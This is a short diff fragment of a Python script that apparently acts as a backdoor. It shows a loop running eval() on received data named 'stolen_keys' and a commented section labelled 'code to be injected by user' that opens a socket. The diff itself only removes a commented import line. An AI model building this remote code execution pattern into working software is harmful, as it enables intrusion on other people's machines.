@@ -17,7 +17,6 @@ while True:
             eval(stolen_keys.decode("utf-8"))
 
 ###################code to be injected by user
-#import os
 #import socket
 
 #ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
